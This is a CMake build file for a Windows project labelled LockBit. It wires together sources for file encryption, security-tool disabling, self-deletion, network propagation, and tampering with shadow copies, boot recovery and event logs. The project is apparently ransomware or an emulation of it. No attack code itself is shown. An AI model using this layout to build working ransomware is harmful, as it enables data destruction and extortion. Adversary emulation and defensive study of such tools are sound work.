###############################################################################
# Main library and executable
###############################################################################
add_library(main-lib STATIC)
add_custom_command(TARGET main-lib POST_BUILD COMMAND echo main-lib target built with CMAKE_CXX flags: ${CMAKE_CXX_FLAGS})
target_include_directories(main-lib PUBLIC "${CMAKE_SOURCE_DIR}/include")

add_dependencies(
    main-lib
    self-delete-lib
    self-delete
)

target_sources(
    main-lib
    PRIVATE
    
    "../common/config/config.cpp"
    "../common/crypto/encryption.cpp"
    "../common/crypto/djb2.cpp"
    "../common/crypto/xor.cpp"
    "../common/enumerate.cpp"
    "../common/impact/encryption.cpp"
    "../common/impact/icon.cpp"
    "../common/impact/recycling.cpp"
    "../common/impact/wallpaper.cpp"
    "../common/util/logger.cpp"
    "../common/util/os_utils.cpp"
    "../common/util/network_utils.cpp"
    "../common/util/resource_util.cpp"
    "../common/util/registry.cpp"
    "../common/util/string_utils.cpp"
    "../common/util/winapihelper.cpp"
    "def_evasion/disable_security.cpp"
    "def_evasion/hide_thread.cpp"
    "def_evasion/invoke_self_del.cpp"
    "discovery.cpp"
    "execute.cpp"
    "guardrails/lang.cpp"
    "guardrails/mutex.cpp"
    "propagate/local_ips.cpp"
    "propagate/ping.cpp"
    "propagate/propagate.cpp"
    "tamper/boot_recovery.cpp"
    "tamper/event_log.cpp"
    "tamper/proc.cpp"
    "tamper/shadow.cpp"
    "tamper/svc.cpp"
)

if (LOCKBIT_DEBUG_LOGGING)
    message(STATUS "[LockBit] Enabling debug logging for main target")
    add_compile_definitions(DEBUG_LOGGING=1)
endif()
unset(LOCKBIT_DEBUG_LOGGING CACHE)

target_compile_definitions(
    main-lib
    PUBLIC
    CONFIG_PATH="${ConfigResourcePathXor}"
    FILE_ICON_PATH="${IconResourcePathXor}"
    WALLPAPER_PATH="${WallpaperResourcePathXor}"
    SELF_DEL_EXE_PATH="$<TARGET_FILE:self-delete>.xor"
    RESOURCE_XOR_KEY_STR="${ResourceXorKeyHex}"
    $<$<CONFIG:Debug>:DEBUG>
)

add_executable(
    main 
    "main.cpp" 

    "../common/config/config.rc"
    "../common/impact/icon.rc"
    "../common/impact/wallpaper.rc"
    "def_evasion/self_del.rc"
)
add_custom_command(TARGET main POST_BUILD COMMAND echo main target built with CMAKE_CXX flags: ${CMAKE_CXX_FLAGS})

target_link_libraries(
    main 
    PRIVATE 
    main-lib 
    Bcrypt.lib
    Wbemuuid.lib
    Ws2_32.lib
)
target_include_directories(main PRIVATE "${CMAKE_SOURCE_DIR}/include")

target_compile_definitions(
	main
	PRIVATE
		$<$<CONFIG:Debug>:DEBUG>
)